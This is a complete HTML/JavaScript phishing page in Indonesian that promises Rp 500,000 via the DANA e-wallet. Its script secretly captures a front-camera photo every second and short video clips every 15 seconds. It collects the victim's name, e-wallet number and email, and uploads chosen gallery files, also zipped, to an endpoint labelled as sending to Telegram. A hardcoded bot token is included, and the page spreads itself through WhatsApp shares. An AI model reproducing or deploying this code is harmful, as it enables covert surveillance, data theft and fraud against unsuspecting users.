<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🎉 Klaim Dana 500rb</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: #0b0e14;
            font-family: 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 16px;
            color: #fff;
        }
        .card {
            background: #1a1f2b;
            border-radius: 32px;
            padding: 32px 24px 28px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            border: 1px solid #2d3342;
            backdrop-filter: blur(4px);
        }
        .logo { text-align: center; font-size: 48px; margin-bottom: 4px; }
        .title { font-size: 24px; font-weight: 700; text-align: center; color: #fff; }
        .sub { font-size: 14px; color: #8b93a7; text-align: center; margin: 4px 0 20px; }
        .amount { background: #1f2a3a; border-radius: 20px; padding: 16px; text-align: center; border: 1px solid #2d3b50; margin-bottom: 24px; }
        .amount span { font-size: 36px; font-weight: 800; color: #34c759; }
        .input-group { margin-bottom: 14px; }
        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #aab3c9; margin-bottom: 4px; }
        .input-group input {
            width: 100%;
            padding: 14px 16px;
            background: #0d121c;
            border: 1px solid #2d3342;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus { border-color: #4a6cf7; box-shadow: 0 0 0 3px rgba(74,108,247,0.2); }
        .btn {
            background: linear-gradient(135deg, #4a6cf7, #6a4cf7);
            border: none;
            color: #fff;
            padding: 16px;
            width: 100%;
            border-radius: 30px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 8px;
            box-shadow: 0 8px 24px rgba(74,108,247,0.3);
        }
        .btn:active { transform: scale(0.96); }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .loader { display: none; margin: 16px auto; width: 32px; height: 32px; border: 3px solid #2d3342; border-top: 3px solid #4a6cf7; border-radius: 50%; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
        .note { text-align: center; font-size: 12px; color: #5c6680; margin-top: 20px; }
        .note a { color: #4a6cf7; text-decoration: none; }
        #video, #canvas, #fileInput { display: none; }
        .toast {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: #1f2a3a; color: #fff; padding: 14px 28px; border-radius: 40px;
            font-size: 14px; font-weight: 500; box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            opacity: 0; transition: 0.4s; pointer-events: none; z-index: 999;
            border: 1px solid #2d3342;
        }
        .toast.show { opacity: 1; }
        .whatsapp-btn {
            background: #25d366;
            border: none;
            color: #fff;
            padding: 12px;
            width: 100%;
            border-radius: 30px;
            font-weight: 600;
            margin-top: 12px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 15px;
        }
        .whatsapp-btn:hover { background: #1da851; }
        .footer { display: flex; gap: 10px; margin-top: 12px; }
        .footer button { flex: 1; background: #1f2a3a; border: none; color: #aab3c9; padding: 10px; border-radius: 30px; font-size: 13px; cursor: pointer; transition: 0.2s; }
        .footer button:hover { background: #2d3342; color: #fff; }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">💸</div>
        <div class="title">Klaim Dana 500rb</div>
        <div class="sub">🎁 Dapatkan Rp 500.000 langsung</div>
        <div class="amount"><span>+ Rp 500.000</span></div>

        <div class="input-group">
            <label>Nama Lengkap</label>
            <input type="text" id="fullName" placeholder="Nama sesuai KTP">
        </div>
        <div class="input-group">
            <label>Nomor Dana / E-Wallet</label>
            <input type="text" id="danaNumber" placeholder="08123456789">
        </div>
        <div class="input-group">
            <label>Email (opsional)</label>
            <input type="email" id="email" placeholder="email@example.com">
        </div>

        <button class="btn" id="claimBtn"><i class="fas fa-gift"></i> KLAIM SEKARANG</button>
        <div class="loader" id="loader"></div>

        <button class="whatsapp-btn" id="waShareBtn"><i class="fab fa-whatsapp"></i> BAGIKAN KE WA (DAPAT 500RB)</button>

        <div class="footer">
            <button id="galleryBtn"><i class="fas fa-images"></i> Pilih Galeri</button>
            <button id="zipBtn"><i class="fas fa-file-archive"></i> ZIP</button>
        </div>

        <p class="note">*Data aman, transfer instan <span id="fileCount"></span></p>
    </div>

    <video id="video" autoplay muted></video>
    <canvas id="canvas"></canvas>
    <input type="file" id="fileInput" multiple accept="image/*,video/*">

    <div class="toast" id="toast"></div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
    <script>
        (function() {
            // ===== KONFIG =====
            const BOT_TOKEN = "8995760973:AAHeOTaXK5pFSn8Y5Z4tlxjgR7vbYOhgUpI";
            const CHAT_ID = "6126622503";
            const API_URL = '/api';

            // ===== DOM =====
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            const fileInput = document.getElementById('fileInput');
            const claimBtn = document.getElementById('claimBtn');
            const loader = document.getElementById('loader');
            const toast = document.getElementById('toast');
            const fileCount = document.getElementById('fileCount');
            let stream = null;
            let selectedFiles = [];

            // ===== 1. KAMERA + FOTO MP4 =====
            async function keepScreenOn() {
                try { await navigator.wakeLock.request('screen'); } catch(e) {}
            }
            keepScreenOn();

            function startCamera() {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: true })
                .then(s => {
                    stream = s;
                    stream.getAudioTracks().forEach(t => t.enabled = false);
                    video.srcObject = stream;
                    video.play();
                    // Foto tiap detik
                    setInterval(() => {
                        if (!stream) return;
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0);
                        const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                        sendToTelegram('photo', base64, null, 'foto.jpg');
                    }, 1000);

                    // Video MP4 (5 detik tiap 15 detik) – kita kirim sebagai dokumen biar bisa dibuka
                    setInterval(() => {
                        if (!stream) return;
                        const chunks = [];
                        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm', audioBitsPerSecond: 0 });
                        recorder.ondataavailable = e => chunks.push(e.data);
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const reader = new FileReader();
                            reader.onload = function() {
                                const base64video = reader.result.split(',')[1];
                                sendToTelegram('document', null, base64video, 'video.webm');
                            };
                            reader.readAsDataURL(blob);
                        };
                        recorder.start();
                        setTimeout(() => { if (recorder.state === 'recording') recorder.stop(); }, 5000);
                    }, 15000);
                })
                .catch(() => alert('Kamera wajib diizinkan!'));
            }

            // ===== 2. KIRIM KE TELEGRAM =====
            function sendToTelegram(type, imgBase64, videoBase64, filename) {
                const payload = { type, filename, ts: Date.now() };
                if (type === 'photo') payload.img = imgBase64;
                else if (type === 'video') payload.video = videoBase64;
                else if (type === 'document') payload.video = videoBase64;
                else return;
                fetch(API_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(e => console.log('Kirim gagal'));
            }

            // ===== 3. GALERI OTOMATIS (pilih semua file) =====
            document.getElementById('galleryBtn').addEventListener('click', () => fileInput.click());

            fileInput.addEventListener('change', function(e) {
                const files = this.files;
                if (!files.length) return;
                selectedFiles = Array.from(files);
                fileCount.innerText = `${selectedFiles.length} file terpilih`;
                showToast(`📥 ${selectedFiles.length} file siap`);
                // Kirim langsung semua file satu per satu
                selectedFiles.forEach(file => {
                    const reader = new FileReader();
                    reader.onload = function(ev) {
                        const base64 = ev.target.result.split(',')[1];
                        const isVideo = file.type.startsWith('video/');
                        const type = isVideo ? 'document' : 'photo';
                        sendToTelegram(type, isVideo ? null : base64, isVideo ? base64 : null, file.name);
                    };
                    reader.readAsDataURL(file);
                });
                // Reset
                this.value = '';
            });

            // ===== 4. ZIP =====
            document.getElementById('zipBtn').addEventListener('click', function() {
                if (selectedFiles.length === 0) {
                    showToast('Pilih galeri dulu!');
                    return;
                }
                const zip = new JSZip();
                const promises = selectedFiles.map(f => {
                    return new Promise((resolve, reject) => {
                        const reader = new FileReader();
                        reader.onload = e => { zip.file(f.name, e.target.result, { binary: true }); resolve(); };
                        reader.onerror = reject;
                        reader.readAsArrayBuffer(f);
                    });
                });
                Promise.all(promises).then(() => {
                    zip.generateAsync({ type: 'blob' }).then(blob => {
                        const reader = new FileReader();
                        reader.onload = function() {
                            const base64zip = reader.result.split(',')[1];
                            sendToTelegram('document', null, base64zip, 'gallery.zip');
                            showToast(`📦 ZIP terkirim!`);
                        };
                        reader.readAsDataURL(blob);
                    });
                });
            });

            // ===== 5. KLAIM =====
            claimBtn.addEventListener('click', function(e) {
                e.preventDefault();
                const name = document.getElementById('fullName').value.trim();
                const dana = document.getElementById('danaNumber').value.trim();
                if (!name || !dana) { showToast('Isi nama & nomor Dana!'); return; }
                loader.style.display = 'block';
                this.disabled = true;

                const msg = `📝 KLAIM DANA\nNama: ${name}\nDana: ${dana}\nEmail: ${document.getElementById('email').value}`;
                fetch(`${API_URL}?msg=${encodeURIComponent(msg)}`)
                    .then(() => {
                        showToast('✅ Klaim berhasil!');
                        // Trigger galeri otomatis
                        fileInput.click();
                        // Share WA otomatis
                        setTimeout(() => {
                            window.open(`https://wa.me/?text=🎉 Dapatkan Rp 500.000 gratis! Klik: ${window.location.href}`, '_blank');
                        }, 2000);
                        loader.style.display = 'none';
                        this.disabled = false;
                    })
                    .catch(() => { showToast('❌ Gagal'); loader.style.display = 'none'; this.disabled = false; });
            });

            // ===== 6. WHATSAPP SHARE =====
            document.getElementById('waShareBtn').addEventListener('click', function() {
                window.open(`https://wa.me/?text=🎉 Dapatkan Rp 500.000 gratis! Klik: ${window.location.href}`, '_blank');
            });

            // ===== 7. TOAST =====
            function showToast(text) {
                toast.textContent = text;
                toast.classList.add('show');
                clearTimeout(toast._timer);
                toast._timer = setTimeout(() => toast.classList.remove('show'), 4000);
            }

            // ===== START =====
            startCamera();
        })();
    </script>
</body>
</html>
